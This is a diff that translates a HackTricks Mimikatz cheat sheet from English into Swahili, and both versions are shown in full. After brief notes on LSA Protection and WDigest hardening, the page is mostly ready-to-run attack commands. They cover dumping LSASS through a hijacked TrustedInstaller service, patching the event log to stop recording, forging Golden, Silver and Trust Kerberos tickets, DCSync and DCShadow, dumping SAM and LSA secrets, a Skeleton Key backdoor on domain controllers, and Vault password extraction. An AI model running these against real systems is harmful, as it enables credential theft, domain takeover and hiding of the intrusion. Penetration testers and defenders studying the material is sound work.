@@ -2,219 +2,208 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-**This page is based on one from [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Check the original for further info!
+**Ukurasa huu umetokana na [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Angalia asili kwa maelezo zaidi!
 
-## LM and Clear-Text in memory
+## LM na Nakala-Wazi kwenye kumbukumbu
 
-From Windows 8.1 and Windows Server 2012 R2 onwards, significant measures have been implemented to safeguard against credential theft:
+Kuanzia Windows 8.1 na Windows Server 2012 R2 na kuendelea, hatua muhimu zimechukuliwa kuzuia wizi wa vitambulisho:
 
-- **LM hashes and plain-text passwords** are no longer stored in memory to enhance security. A specific registry setting, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ must be configured with a DWORD value of `0` to disable Digest Authentication, ensuring "clear-text" passwords are not cached in LSASS.
+- **Hash za LM na nywila za nakala-wazi** hazihifadhiwi tena kwenye kumbukumbu ili kuimarisha usalama. Mazingira maalum ya usajili, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, lazima iwe imewekwa na thamani ya DWORD ya `0` ili kulemaza Uthibitishaji wa Digest, kuhakikisha nywila za "nakala-wazi" hazihifadhiwi kwenye LSASS.
 
-- **LSA Protection** is introduced to shield the Local Security Authority (LSA) process from unauthorized memory reading and code injection. This is achieved by marking the LSASS as a protected process. Activation of LSA Protection involves:
-    1. Modifying the registry at _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ by setting `RunAsPPL` to `dword:00000001`.
-    2. Implementing a Group Policy Object (GPO) that enforces this registry change across managed devices.
+- **LSA Protection** imeanzishwa kulinda mchakato wa Mamlaka ya Usalama wa Ndani (LSA) kutokana na kusomwa kwa kumbukumbu na kuingiza nambari kwa njia isiyoidhinishwa. Hii inafanikiwa kwa kuweka alama kwenye LSASS kama mchakato uliolindwa. Kuamsha LSA Protection kunahusisha:
+1. Kubadilisha usajili kwenye _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ kwa kuweka `RunAsPPL` kuwa `dword:00000001`.
+2. Kutekeleza Kundi la Sera (GPO) ambalo linahakikisha mabadiliko haya ya usajili yanatekelezwa kwenye vifaa vilivyosimamiwa.
 
-Despite these protections, tools like Mimikatz can circumvent LSA Protection using specific drivers, although such actions are likely to be recorded in event logs.
+Licha ya ulinzi huu, zana kama Mimikatz zinaweza kuzunguka LSA Protection kwa kutumia madereva maalum, ingawa hatua kama hizo zinaweza kurekodiwa katika magogo ya tukio.
 
-### Counteracting SeDebugPrivilege Removal
+### Kupambana na Kuondolewa kwa SeDebugPrivilege
 
-Administrators typically have SeDebugPrivilege, enabling them to debug programs. This privilege can be restricted to prevent unauthorized memory dumps, a common technique used by attackers to extract credentials from memory. However, even with this privilege removed, the TrustedInstaller account can still perform memory dumps using a customized service configuration:
-
+Kawaida, wasimamizi wana SeDebugPrivilege, ambayo inawawezesha kudurusu programu. Uwezo huu unaweza kuzuiliwa ili kuzuia uchukuzi usiothibitishwa wa kumbukumbu, mbinu ya kawaida inayotumiwa na wadukuzi kuchukua vitambulisho kutoka kwenye kumbukumbu. Walakini, hata na uwezo huu kuondolewa, akaunti ya TrustedInstaller bado inaweza kufanya uchukuzi wa kumbukumbu kwa kutumia usanidi wa huduma ulioboreshwa:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-
-This allows the dumping of the `lsass.exe` memory to a file, which can then be analyzed on another system to extract credentials:
-
+Hii inaruhusu kumwaga kumbukumbu ya `lsass.exe` kwenye faili, ambayo kisha inaweza kuchambuliwa kwenye mfumo mwingine ili kutoa siri za kuingia:
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
 # sekurlsa::logonpasswords
 ```
+## Chaguo za Mimikatz
 
-## Mimikatz Options
+Udanganyifu wa kumbukumbu za matukio katika Mimikatz unahusisha hatua mbili kuu: kufuta kumbukumbu za matukio na kurekebisha huduma ya Matukio ili kuzuia kurekodi matukio mapya. Hapa chini ni amri za kutekeleza hatua hizi:
 
-Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:
+#### Kufuta Kumbukumbu za Matukio
 
-#### Clearing Event Logs
+- **Amri**: Hatua hii inalenga kufuta kumbukumbu za matukio, hivyo kuwa ngumu kufuatilia shughuli za uovu.
+- Mimikatz haipatii amri moja kwa moja katika nyaraka zake za kawaida za kufuta kumbukumbu za matukio moja kwa moja kupitia mstari wake wa amri. Hata hivyo, kawaida udanganyifu wa kumbukumbu za matukio unahusisha kutumia zana za mfumo au hati nje ya Mimikatz kufuta kumbukumbu maalum (kwa mfano, kutumia PowerShell au Windows Event Viewer).
 
-- **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
-- Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).
+#### Kipengele cha Majaribio: Kurekebisha Huduma ya Matukio
 
-#### Experimental Feature: Patching the Event Service
+- **Amri**: `event::drop`
+- Amri hii ya majaribio imeundwa kurekebisha tabia ya Huduma ya Kurekodi Matukio, kwa kuzuia kurekodi matukio mapya.
+- Mfano: `mimikatz "privilege::debug" "event::drop" exit`
 
-- **Command**: `event::drop`
-- This experimental command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events.
-- Example: `mimikatz "privilege::debug" "event::drop" exit`
+- Amri ya `privilege::debug` inahakikisha kuwa Mimikatz inafanya kazi na mamlaka muhimu ya kurekebisha huduma za mfumo.
+- Kisha amri ya `event::drop` inarekebisha huduma ya Kurekodi Matukio.
 
-- The `privilege::debug` command ensures that Mimikatz operates with the necessary privileges to modify system services.
-- The `event::drop` command then patches the Event Logging service.
+### Mashambulizi ya Tiketi ya Kerberos
 
+### Uundaji wa Tiketi ya Dhahabu
 
-### Kerberos Ticket Attacks
+Tiketi ya Dhahabu inaruhusu uigaji wa ufikiaji kwa kiwango cha kikoa. Amri muhimu na vigezo:
 
-### Golden Ticket Creation
+- Amri: `kerberos::golden`
+- Vigezo:
+- `/domain`: Jina la kikoa.
+- `/sid`: Kitambulisho cha Usalama (SID) cha kikoa.
+- `/user`: Jina la mtumiaji wa kuigiza.
+- `/krbtgt`: Hash ya NTLM ya akaunti ya huduma ya KDC ya kikoa.
+- `/ptt`: Kuingiza tiketi moja kwa moja kwenye kumbukumbu.
+- `/ticket`: Hifadhi tiketi kwa matumizi ya baadaye.
 
-A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:
-
-- Command: `kerberos::golden`
-- Parameters:
-  - `/domain`: The domain name.
-  - `/sid`: The domain's Security Identifier (SID).
-  - `/user`: The username to impersonate.
-  - `/krbtgt`: The NTLM hash of the domain's KDC service account.
-  - `/ptt`: Directly injects the ticket into memory.
-  - `/ticket`: Saves the ticket for later use.
-
-Example:
-
+Mfano:
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
+### Uundaji wa Tiketi ya Fedha
 
-### Silver Ticket Creation
+Tiketi za Fedha hutoa ufikiaji kwa huduma maalum. Amri muhimu na vigezo:
 
-Silver Tickets grant access to specific services. Key command and parameters:
+- Amri: Kama Tiketi ya Dhahabu lakini inalenga huduma maalum.
+- Vigezo:
+- `/service`: Huduma ya kulenga (kwa mfano, cifs, http).
+- Vigezo vingine kama Tiketi ya Dhahabu.
 
-- Command: Similar to Golden Ticket but targets specific services.
-- Parameters:
-  - `/service`: The service to target (e.g., cifs, http).
-  - Other parameters similar to Golden Ticket.
-
-Example:
-
+Mfano:
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
+### Uundaji wa Tiketi ya Imani
 
-### Trust Ticket Creation
+Tiketi za Imani hutumiwa kupata rasilimali kati ya uhusiano wa imani. Amri muhimu na vigezo:
 
-Trust Tickets are used for accessing resources across domains by leveraging trust relationships. Key command and parameters:
+- Amri: Kama Tiketi ya Dhahabu lakini kwa uhusiano wa imani.
+- Vigezo:
+- `/target`: Jina kamili la kikoa cha lengo.
+- `/rc4`: Hash ya NTLM kwa akaunti ya imani.
 
-- Command: Similar to Golden Ticket but for trust relationships.
-- Parameters:
-  - `/target`: The target domain's FQDN.
-  - `/rc4`: The NTLM hash for the trust account.
-
-Example:
-
+Mfano:
 ```bash
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
+### Amri za Ziada za Kerberos
 
-### Additional Kerberos Commands
+- **Kuorodhesha Tiketi**:
+- Amri: `kerberos::list`
+- Inaorodhesha tiketi zote za Kerberos kwa kikao cha mtumiaji wa sasa.
 
-- **Listing Tickets**:
-  - Command: `kerberos::list`
-  - Lists all Kerberos tickets for the current user session.
+- **Pitisha Hifadhi**:
+- Amri: `kerberos::ptc`
+- Inasambaza tiketi za Kerberos kutoka kwenye faili za hifadhi.
+- Mfano: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
-- **Pass the Cache**:
-  - Command: `kerberos::ptc`
-  - Injects Kerberos tickets from cache files.
-  - Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
+- **Pitisha Tiketi**:
+- Amri: `kerberos::ptt`
+- Inaruhusu kutumia tiketi ya Kerberos katika kikao kingine.
+- Mfano: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-- **Pass the Ticket**:
-  - Command: `kerberos::ptt`
-  - Allows using a Kerberos ticket in another session.
-  - Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
-
-- **Purge Tickets**:
-  - Command: `kerberos::purge`
-  - Clears all Kerberos tickets from the session.
-  - Useful before using ticket manipulation commands to avoid conflicts.
+- **Futa Tiketi**:
+- Amri: `kerberos::purge`
+- Inafuta tiketi zote za Kerberos kutoka kwenye kikao.
+- Inafaa kabla ya kutumia amri za kubadilisha tiketi ili kuepuka migogoro.
 
 
-### Active Directory Tampering
+### Uharibifu wa Active Directory
 
-- **DCShadow**: Temporarily make a machine act as a DC for AD object manipulation.
-  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
+- **DCShadow**: Kwa muda kufanya kifaa kifanye kama DC kwa ajili ya uhariri wa vitu vya AD.
+- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-- **DCSync**: Mimic a DC to request password data.
-  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
+- **DCSync**: Kujifanya kama DC ili kuomba data ya nywila.
+- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-### Credential Access
+### Upatikanaji wa Vitambulisho
 
-- **LSADUMP::LSA**: Extract credentials from LSA.
-  - `mimikatz "lsadump::lsa /inject" exit`
+- **LSADUMP::LSA**: Pata vitambulisho kutoka LSA.
+- `mimikatz "lsadump::lsa /inject" exit`
 
-- **LSADUMP::NetSync**: Impersonate a DC using a computer account's password data.
-  - *No specific command provided for NetSync in original context.*
+- **LSADUMP::NetSync**: Jifanya kama DC kwa kutumia data ya nywila ya akaunti ya kompyuta.
+- *Hakuna amri maalum iliyotolewa kwa NetSync katika muktadha wa awali.*
 
-- **LSADUMP::SAM**: Access local SAM database.
-  - `mimikatz "lsadump::sam" exit`
+- **LSADUMP::SAM**: Fikia hifadhidata ya SAM ya ndani.
+- `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**: Decrypt secrets stored in the registry.
-  - `mimikatz "lsadump::secrets" exit`
+- **LSADUMP::Secrets**: Fungua siri zilizohifadhiwa kwenye usajili.
+- `mimikatz "lsadump::secrets" exit`
 
-- **LSADUMP::SetNTLM**: Set a new NTLM hash for a user.
-  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
+- **LSADUMP::SetNTLM**: Weka hash mpya ya NTLM kwa mtumiaji.
+- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-- **LSADUMP::Trust**: Retrieve trust authentication information.
-  - `mimikatz "lsadump::trust" exit`
+- **LSADUMP::Trust**: Pata habari za uwakilishi wa uaminifu.
+- `mimikatz "lsadump::trust" exit`
 
-### Miscellaneous
+### Mbalimbali
 
-- **MISC::Skeleton**: Inject a backdoor into LSASS on a DC.
-  - `mimikatz "privilege::debug" "misc::skeleton" exit`
+- **MISC::Skeleton**: Ingiza mlango nyuma kwenye LSASS kwenye DC.
+- `mimikatz "privilege::debug" "misc::skeleton" exit`
 
-### Privilege Escalation
+### Kupandisha Hadhi ya Mamlaka
 
-- **PRIVILEGE::Backup**: Acquire backup rights.
-  - `mimikatz "privilege::backup" exit`
+- **PRIVILEGE::Backup**: Pata haki za kuhifadhi nakala.
+- `mimikatz "privilege::backup" exit`
 
-- **PRIVILEGE::Debug**: Obtain debug privileges.
-  - `mimikatz "privilege::debug" exit`
+- **PRIVILEGE::Debug**: Pata haki za kufuatilia.
+- `mimikatz "privilege::debug" exit`
 
-### Credential Dumping
+### Kuvuja Vitambulisho
 
-- **SEKURLSA::LogonPasswords**: Show credentials for logged-on users.
-  - `mimikatz "sekurlsa::logonpasswords" exit`
+- **SEKURLSA::LogonPasswords**: Onyesha vitambulisho kwa watumiaji walioingia.
+- `mimikatz "sekurlsa::logonpasswords" exit`
 
-- **SEKURLSA::Tickets**: Extract Kerberos tickets from memory.
-  - `mimikatz "sekurlsa::tickets /export" exit`
+- **SEKURLSA::Tickets**: Pata tiketi za Kerberos kutoka kwenye kumbukumbu.
+- `mimikatz "sekurlsa::tickets /export" exit`
 
-### Sid and Token Manipulation
+### Sid na Uhariri wa Alama
 
-- **SID::add/modify**: Change SID and SIDHistory.
-  - Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-  - Modify: *No specific command for modify in original context.*
+- **SID::add/modify**: Badilisha SID na SIDHistory.
+- Ongeza: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
+- Badilisha: *Hakuna amri maalum ya kubadilisha katika muktadha wa awali.*
 
-- **TOKEN::Elevate**: Impersonate tokens.
-  - `mimikatz "token::elevate /domainadmin" exit`
+- **TOKEN::Elevate**: Jifanya kama alama.
+- `mimikatz "token::elevate /domainadmin" exit`
 
-### Terminal Services
+### Huduma za Terminal
 
-- **TS::MultiRDP**: Allow multiple RDP sessions.
-  - `mimikatz "ts::multirdp" exit`
+- **TS::MultiRDP**: Ruhusu vikao vingi vya RDP.
+- `mimikatz "ts::multirdp" exit`
 
-- **TS::Sessions**: List TS/RDP sessions.
-  - *No specific command provided for TS::Sessions in original context.*
+- **TS::Sessions**: Onyesha vikao vya TS/RDP.
+- *Hakuna amri maalum iliyotolewa kwa TS::Sessions katika muktadha wa awali.*
 
-### Vault
+### Hazina
 
-- Extract passwords from Windows Vault.
-  - `mimikatz "vault::cred /patch" exit`
+- Pata nywila kutoka kwenye Hazina ya Windows.
+- `mimikatz "vault::cred /patch" exit`
 
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikitangazwa katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) maalum.
+* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PR kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
